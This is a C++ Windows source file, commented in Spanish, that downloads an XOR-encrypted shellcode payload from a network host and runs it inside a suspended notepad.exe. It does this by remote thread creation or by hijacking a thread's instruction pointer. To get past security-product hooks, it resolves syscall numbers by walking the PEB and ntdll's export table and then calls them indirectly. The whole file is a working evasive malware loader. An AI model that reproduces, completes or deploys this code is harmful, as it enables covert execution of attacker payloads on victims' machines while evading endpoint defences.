#include <windows.h>
#include <wininet.h>
#include <stdio.h>
#include "structs.h"
#include <TlHelp32.h>

#pragma comment(lib, "wininet.lib")

typedef NTSTATUS(WINAPI* NtOpenProcess_t)(
	PHANDLE ProcessHandle,
	ACCESS_MASK DesiredAccess,
	POBJECT_ATTRIBUTES ObjectAttributes,
	PCLIENT_ID ClientId
	);

typedef NTSTATUS(NTAPI* NtAllocateVirtualMemory)(
	HANDLE ProcessHandle,
	PVOID* BaseAddress,
	ULONG_PTR ZeroBits,
	PSIZE_T RegionSize,
	ULONG AllocationType,
	ULONG Protect
	);

typedef NTSTATUS(NTAPI* NtWriteVirtualMemory)(
	HANDLE ProcessHandle,
	PVOID BaseAddress,
	PVOID Buffer,
	SIZE_T NumberOfBytesToWrite,
	PULONG NumberOfBytesWritten
	);

typedef NTSTATUS(NTAPI* NtCreateThreadEx)(
	PHANDLE ThreadHandle,
	ACCESS_MASK DesiredAccess,
	POBJECT_ATTRIBUTES ObjectAttributes,
	HANDLE ProcessHandle,
	PVOID StartRoutine,
	PVOID Argument,
	ULONG CreateFlags,
	SIZE_T ZeroBits,
	SIZE_T StackSize,
	SIZE_T MaximumStackSize,
	PVOID AttributeList
	);

typedef NTSTATUS(NTAPI* NtGetContextThread)(
	HANDLE ThreadHandle,
	PCONTEXT pContext
	);

typedef NTSTATUS(NTAPI* NtSetContextThread)(
	HANDLE ThreadHandle,
	PCONTEXT pContext
	);

typedef NTSTATUS(NTAPI* NtResumeThread)(
	HANDLE ThreadHandle, 
	PULONG SuspendCount
	);

typedef NTSTATUS(NTAPI* NtSuspendThread)(
	HANDLE ThreadHandle,
	PULONG PreviousSuspendCount
	);

extern "C" int _ssn = 0;
extern "C" void* _direccionRetornoSyscall = 0;
extern "C" void indirectSyscalling();

const char* url = "http://192.168.0.200/shellcode_encrypted.bin";
DWORD bytesTotales = 0;
BYTE* shellcodeBuffer = (BYTE*)malloc(1000000);

HMODULE infoPEB(LPCWSTR nombreModulo) {
	//peb address
	PEB* peb = (PEB*)__readgsqword(0x60);
	printf("[!] PEB address: %p\n", peb);

	//Debugged
	if (peb->BeingDebugged) {
		printf("[!] El ejecutable esta siendo debugged");
	}
	else {
		printf("[!] El programa no esta siendo debugged\n");
	}

	//puntero que contiene información de los modulos cargados
	PEB_LDR_DATA* pModulos = peb->Ldr;
	printf("[!] Puntero a los modulos: %p\n", pModulos);

	//INFO estructura PEB_LDR_DATA
	//Lista modulos en orden de carga
	LIST_ENTRY* lModulosOrdenCarga = &pModulos->InLoadOrderModuleList;

	printf("[!] Lista modulos en orden de carga\n");
	for (LIST_ENTRY* i = lModulosOrdenCarga->Flink; i != lModulosOrdenCarga; i = i->Flink) {
		LDR_DATA_TABLE_ENTRY* direccionModulo = CONTAINING_RECORD(i, LDR_DATA_TABLE_ENTRY, InLoadOrderLinks);
		printf("\t[+] Modulo cargado: %ws -> baseAddress: %p\n", direccionModulo->BaseDllName.Buffer, direccionModulo->DllBase);
	}

	//Lista modulos en orden de memoria
	LIST_ENTRY* lModulosOrdenMemoria = &pModulos->InMemoryOrderModuleList;

	printf("[!] Lista modulos en orden de memoria\n");
	for (LIST_ENTRY* i = lModulosOrdenMemoria->Flink; i != lModulosOrdenMemoria; i = i->Flink) {
		LDR_DATA_TABLE_ENTRY* direccionModulo = CONTAINING_RECORD(i, LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks);
		printf("\t[+] Modulo cargado: %ws -> baseAddress: %p\n", direccionModulo->BaseDllName.Buffer, direccionModulo->DllBase);
	}
	//Lista de modulos en orden de inicializacíon
	LIST_ENTRY* lModulosOrdenInicializacion = &pModulos->InInitializationOrderModuleList;

	HMODULE handleModulo = NULL;

	printf("[!] Lista modulos en orden de inicializacion\n");
	for (LIST_ENTRY* i = lModulosOrdenInicializacion->Flink; i != lModulosOrdenInicializacion; i = i->Flink) {
		LDR_DATA_TABLE_ENTRY* direccionModulo = CONTAINING_RECORD(i, LDR_DATA_TABLE_ENTRY, InInitializationOrderLinks);
		printf("\t[+] Modulo cargado: %ws -> baseAddress: %p\n", direccionModulo->BaseDllName.Buffer, direccionModulo->DllBase);
		if (lstrcmpiW(direccionModulo->BaseDllName.Buffer, nombreModulo) == 0) {
			handleModulo = (HMODULE)direccionModulo->DllBase;
		}
		return handleModulo;
	}
}

PVOID infoEAT(HMODULE handleModulo, LPCSTR funcion) {
	printf("\n\n[!] Informacion del modulo");

	//Cabeceras del modulo
	IMAGE_DOS_HEADER* dos = (IMAGE_DOS_HEADER*)handleModulo;
	printf("\n[!] Cabecera DOS: 0x%X\n", dos->e_lfanew);
	IMAGE_NT_HEADERS* nt = (IMAGE_NT_HEADERS*)((BYTE*)handleModulo + dos->e_lfanew);
	printf("[!] Cabecera NT: 0x%X\n", nt->Signature);

	printf("\n[!] Info general tabla de exportaciones\n");
	IMAGE_DATA_DIRECTORY* infoGeneralTE = &nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
	printf("\tTamano: %d\n", infoGeneralTE->Size);
	printf("\tVirtual Address: 0x%X\n", infoGeneralTE->VirtualAddress);

	IMAGE_EXPORT_DIRECTORY* infoContenidoTE = (IMAGE_EXPORT_DIRECTORY*)((BYTE*)handleModulo + infoGeneralTE->VirtualAddress);
	printf("\t[+] Numero de funciones: %d\n", infoContenidoTE->NumberOfFunctions);
	printf("\t[+] Numero de nombres: %d\n", infoContenidoTE->NumberOfNames);

	//Para calcular las Virtual Address hay que sumar el baseAddress del módulo + RVA (Relative Virtual Address)
	DWORD* direccionesFunciones = (DWORD*)((BYTE*)handleModulo + infoContenidoTE->AddressOfFunctions);
	DWORD* nombresFunciones = (DWORD*)((BYTE*)handleModulo + infoContenidoTE->AddressOfNames);
	WORD* indicesFunciones = (WORD*)((BYTE*)handleModulo + infoContenidoTE->AddressOfNameOrdinals);
	PVOID direccionVAFuncion = NULL;

	for (int i = 0; i < infoContenidoTE->NumberOfFunctions; i++) {

		char* nombreFuncion = (char*)((BYTE*)handleModulo + nombresFunciones[i]);
		if (i > 420 && i <= 424) {
			printf("\tNombre funcion: %s, direccion: 0x%X, indice: %d\n", nombreFuncion, direccionesFunciones[i], indicesFunciones[i]);
		}
		if (lstrcmpA(nombreFuncion, funcion) == 0) {
			
			DWORD indice = (DWORD)indicesFunciones[i];
			//Se puede usar el indice o i+1
			DWORD RVAfuncion = direccionesFunciones[indice];
			direccionVAFuncion = (PVOID)((BYTE*)handleModulo + RVAfuncion);

			printf("\t\t[+] Indice: %d\n", indice);
			printf("\t\t[+] RVA: 0x%X\n", RVAfuncion);
			printf("\t\t[+] Direccion VA: %p\n", direccionVAFuncion);
		}
	}

	if (!direccionVAFuncion) {
		return nullptr;
	}

	return direccionVAFuncion;
}

byte firmaSyscall[] = { 0x4c, 0x8b, 0xd1, 0xb8 };

bool funcionHookeada(PVOID direccionFuncion) {
	printf("\n\n[!] Comprobando si la funcion esta hookeada\n");
	printf("\t[+] Sizeof firmasyscall = %d\n", ((int*)sizeof(firmaSyscall)));
	printf("\tFIRMA SYSCALL    | BYTES DIRECCION FUNCION\n");
	for (int i = 0;i < sizeof(firmaSyscall); i++) {
		printf("\t0x%x\t\t | 0x%x\n", firmaSyscall[i], ((byte*)direccionFuncion)[i]);
		if (firmaSyscall[i] != ((byte*)direccionFuncion)[i]) {
			return true;
		}
	}

	return false;
}

bool encontrarSnn(const char* nombreFuncion, int* ssn, PVOID* direccionRetornoSyscall) {

	//handle ntdll
	HMODULE hNtdll = infoPEB(L"ntdll.dll");
	if (!hNtdll) {
		printf("[-] Error obteniendo handle con el modulo ntdll.dll: %lu\n", GetLastError());
		return false;
	}
	printf("[+] Handle/baseAddress ntdll.dll: %p", hNtdll);

	//direccion funcion nt
	PVOID direccionFuncion = infoEAT(hNtdll, nombreFuncion);
	if (direccionFuncion == nullptr) {
		printf("[-] Error obteniendo la direccion de la funcion: %lu\n", GetLastError());
		return false;
	}

	for (int i = 0; i <= 20; i++) {
		//Al multiplicarse la primera interracion da la misma direccion
		direccionFuncion = (PVOID)((BYTE*)direccionFuncion + 32 * i);
		//Hay 32 bits hasta la siguiente syscall
		printf("\n\t[+] Saltando 32 bits desde NtOpenProcess: 0x%p", direccionFuncion);

		_ssn = *(int*)((byte*)direccionFuncion + 4);
		_direccionRetornoSyscall = (PVOID)((BYTE*)direccionFuncion + 0x12);
		printf("\n\t[+] SSN: %d\n", *(int*)((byte*)direccionFuncion + 4));

		if (!funcionHookeada(direccionFuncion)) {
			printf("\n[+] Funcion no hookeada");
			break;
		}
	}

	return true;
}

int descargarShellcode(const char* url) {
	HINTERNET hInternet = InternetOpenA(NULL, INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
	if (hInternet == NULL) {
		printf("[-] Error iniciando una sesión a www: %lu\n", GetLastError());
		return 1;
	}
	printf("[+] Conexion a www establecida\n");

	HINTERNET hFile = InternetOpenUrlA(hInternet, url, NULL, 0, INTERNET_FLAG_RELOAD, 0);
	if (hFile == NULL) {
		printf("[-] Error abriendo una solicitud a %s: %lu\n", url, GetLastError());
		return 1;
	}
	printf("[+] Solicitud realizada a %s\n", url);

	DWORD bytesLeidos = 0;
	if (!shellcodeBuffer) {
		printf("[-] Error reservando memoria: %lu\n", GetLastError());
		return 1;
	}

	while (InternetReadFile(hFile, shellcodeBuffer + bytesTotales, 4096, &bytesLeidos) && bytesLeidos != 0) {
		bytesTotales += bytesLeidos;
		if (bytesTotales >= 1000000) {
			printf("[-] Se necesita más memoria para leer el shellcode: %lu\n", GetLastError());
			free(shellcodeBuffer);
			return 1;
		}
	}
	printf("[+] Shellcode descargado: %d bytes\n", bytesTotales);

	char key = 'z';
	for (int i = 0; i < bytesTotales; i++) {
		shellcodeBuffer[i] ^= key;
	}

	CloseHandle(hFile);
	CloseHandle(hInternet);
}

int shellcodeInjectionBasic() {
	
	descargarShellcode(url);

	NtAllocateVirtualMemory AVM = (NtAllocateVirtualMemory)(&indirectSyscalling);
	NtWriteVirtualMemory WVM = (NtWriteVirtualMemory)(&indirectSyscalling);
	NtCreateThreadEx CTE = (NtCreateThreadEx)(&indirectSyscalling);

	STARTUPINFOA si = { 0 };
	PROCESS_INFORMATION pi = { 0 };
	if (!CreateProcessA("C:\\Windows\\System32\\notepad.exe", NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi)) {
		printf("\n[-] Error abriendo notepad.exe: %lu\n", GetLastError());
		return 1;
	}

	encontrarSnn("NtAllocateVirtualMemory", &_ssn, &_direccionRetornoSyscall);

	PVOID baseAddress = NULL;
	SIZE_T sShellcodeBuffer = bytesTotales;
	PSIZE_T pSize = &sShellcodeBuffer;
	NTSTATUS status = AVM(pi.hProcess, &baseAddress, 0, pSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	if (status != 0) {
		printf("[-] Error reservando memoria en el proceso remoto: %lu, bytes totales: %d\n", GetLastError(), bytesTotales);
		return 1;
	}
	printf("[+] Memoria reservada en proceso remoto");
	encontrarSnn("NtWriteVirtualMemory", &_ssn, &_direccionRetornoSyscall);
	status = WVM(pi.hProcess, baseAddress, shellcodeBuffer, sShellcodeBuffer, NULL);
	if (status != 0) {
		printf("[-] Error escrbiendo memoria en el proceso remoto: %lu\n", GetLastError());
		return 1;
	}
	printf("[+] Shellcode escrito en proceso remoto");

	encontrarSnn("NtCreateThreadEx", &_ssn, &_direccionRetornoSyscall);

	HANDLE hThread = NULL;
	status = CTE(&hThread, THREAD_ALL_ACCESS, NULL, pi.hProcess, baseAddress, NULL, FALSE, 0, 0, 0, NULL);
	if (status != 0) {
		printf("[-] Error creando hilo en el proceso remoto: %lu\n", GetLastError());
		return 1;
	}
	printf("[+] Hilo creado en proceso remoto\n");

	ResumeThread(pi.hThread);
	printf("[+] Reanudando\n");

	free(shellcodeBuffer);
	CloseHandle(pi.hProcess);
	CloseHandle(hThread);
	CloseHandle(pi.hThread);

	return 0;
}

int threadHijacking() {

	descargarShellcode(url);

	NtAllocateVirtualMemory AVM = (NtAllocateVirtualMemory)(&indirectSyscalling);
	NtWriteVirtualMemory WVM = (NtWriteVirtualMemory)(&indirectSyscalling);
	NtCreateThreadEx CTE = (NtCreateThreadEx)(&indirectSyscalling);
	NtGetContextThread GCT = (NtGetContextThread)(&indirectSyscalling);
	NtSetContextThread SCT = (NtSetContextThread)(&indirectSyscalling);
	NtResumeThread RT = (NtResumeThread)(&indirectSyscalling);

	STARTUPINFOA si = { 0 };
	PROCESS_INFORMATION pi = { 0 };
	if (!CreateProcessA("C:\\Windows\\System32\\notepad.exe", NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi)) {
		printf("[-] Hubo un problema abriendo el notepad.exe: %lu\n", GetLastError());
		return 1;
	}
	printf("[+] Notepad creado correctamente: %d\n", pi.dwProcessId);

	

	PVOID baseAddress = NULL;
	SIZE_T sShellcodeBuffer = bytesTotales;
	PSIZE_T pSize = &sShellcodeBuffer;

	encontrarSnn("NtAllocateVirtualMemory", &_ssn, &_direccionRetornoSyscall);
	NTSTATUS status = AVM(pi.hProcess, &baseAddress, 0, pSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	if (status != 0) {
		printf("[-] Error reservando memoria en el proceso remoto: %lu, bytes totales: %d\n", GetLastError(), bytesTotales);
		return 1;
	}
	printf("[+] Memoria reservada correctamente en el proceso remoto");

	encontrarSnn("NtWriteVirtualMemory", &_ssn, &_direccionRetornoSyscall);
	status = WVM(pi.hProcess, baseAddress, shellcodeBuffer, sShellcodeBuffer, NULL);
	if (status != 0) {
		printf("[-] Error escribiendo memoria en el proceso remoto: %lu, bytes totales: %d\n", GetLastError(), bytesTotales);
		return 1;
	}
	printf("[+] Memoria escrita correctamente en el proceso remoto");

	HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
	THREADENTRY32 te = { 0 };
	te.dwSize = sizeof(THREADENTRY32);

	HANDLE hHiloSecuestrado = NULL;

	while (Thread32Next(hSnapshot, &te)) {
		//Hasta que coincida con el PID del proceso
		if (te.th32OwnerProcessID == pi.dwProcessId) {
			hHiloSecuestrado = OpenThread(THREAD_ALL_ACCESS, FALSE, te.th32ThreadID);
			if (!hHiloSecuestrado) {
				printf("[-] Error obteniendo hilo: %lu", GetLastError());
				return 1;
			}

			printf("[+] Hilo encontrado para el proceso %d\n", pi.dwProcessId);
			break;
		}
	}

	//Syscall de suspender el hilo
	//SuspendThread(hHiloSecuestrado);
	encontrarSnn("NtSuspendThread", &_ssn, &_direccionRetornoSyscall);
	status = RT(hHiloSecuestrado, NULL);
	if (status != 0) {
		printf("\n[-] Error suspendiendo hilo secuestrado: %lu\n", GetLastError());
		return 1;
	}
	printf("\n[+] Hilo secuestrado suspendido\n");

	CONTEXT contexto;
	ZeroMemory(&contexto, sizeof(contexto));
	contexto.ContextFlags = CONTEXT_FULL;

	encontrarSnn("NtGetContextThread", &_ssn, &_direccionRetornoSyscall);
	status = GCT(hHiloSecuestrado, &contexto);
	if (status != 0) {
		printf("\n[-] Error obteniendo contexto: %lu\n", GetLastError());
		return 1;
	}
	//GetThreadContext(hHiloSecuestrado, &contexto);
	printf("\n[+] Contexto obtenido correctamente\n");

	contexto.Rip = (DWORD64)baseAddress;

	encontrarSnn("NtSetContextThread", &_ssn, &_direccionRetornoSyscall);
	status = SCT(hHiloSecuestrado, &contexto);
	if (status != 0) {
		printf("[-] Error estableciendo contexto: %lu\n", GetLastError());
		return 1;
	}
	//SetThreadContext(hHiloSecuestrado, &contexto);
	printf("[+] Contexto establecido correctamente\n");

	encontrarSnn("NtResumeThread", &_ssn, &_direccionRetornoSyscall);
	status = RT(hHiloSecuestrado, NULL);
	if (status != 0) {
		printf("\n[-] Error reanudando hilo: %lu\n", GetLastError());
		return 1;
	}
	printf("\n[+] Reanudando hilo secuestrado\n");

	encontrarSnn("NtResumeThread", &_ssn, &_direccionRetornoSyscall);
	status = RT(pi.hThread, NULL);
	if (status != 0) {
		printf("\n[-] Error reanudando hilo del bloc de notas: %lu\n", GetLastError());
		return 1;
	}
	printf("\n[+] Reanudando hilo del bloc de notas\n");

	return 0;
}

int main(){

	threadHijacking();
	//shellcodeInjectionBasic();

	return 0;
}